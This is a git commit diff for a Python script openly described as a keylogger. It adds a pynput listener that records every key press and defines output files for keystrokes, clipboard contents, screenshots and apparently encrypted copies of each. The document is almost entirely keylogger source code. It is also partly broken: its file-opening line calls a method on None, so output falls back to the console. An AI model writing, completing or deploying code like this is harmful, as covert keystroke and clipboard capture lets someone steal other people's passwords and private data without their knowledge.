74e7a9c8af181ed847dbb0a12287c4a0d7db50f0
gavinlampton <60271526+gavinlampton@users.noreply.github.com>
2022-11-13 20:48:27 -0800

    Working towards a keylogger that logs keys.

--- basicLogger.py
+++ basicLogger.py
@@ -7,27 +7,36 @@ clipboard_info = "clipboard.txt"
 screenshot_info = "screenshot.png"
 keys_info = "key_log.txt"
 
+system_information_e = 'e_system.txt'
+clipboard_information_e = 'e_clipboard.txt'
+keys_information_e = 'e_keys_logged.txt'
+
 class MyListener:
     def __init__(self, outputLocation):
+        self.outLocation = None
         try:
-            self.outLocation = outputLocation
+            self.outLocation.open(outputLocation, "wt")
         except:
             self.outLocation = sys.stdout
 
     def on_press(self, key):
-        self.outLocation.write(key)
+        self.outLocation.write('key {0} pressed'.format(key))
 
-
-    def on_release(key):
-        return key != keyboard.Key.enter
+    def close(self):
+        try:
+            self.outLocation.close()
+        except Exception as e:
+            print(e)
 
 test = MyListener(keys_info)
 
-#with keyboard.Listener(keyboard.Listener(on_press=test.on_press, on_release=test.on_release) as listener:
- #   try:
-   #     listener.join()
-  #  except Exception as e:
-    #    print('{0} exception happened...'.format(e.args[0]))
-
-
 inp = input('Please type:\n')
+
+with keyboard.Listener(on_press=test.on_press, on_release=None) as listener:
+    try:
+        listener.join()
+    except Exception as e:
+        print('{0} exception happened...'.format(e.args[0]))
+    finally:
+        test.close()
+
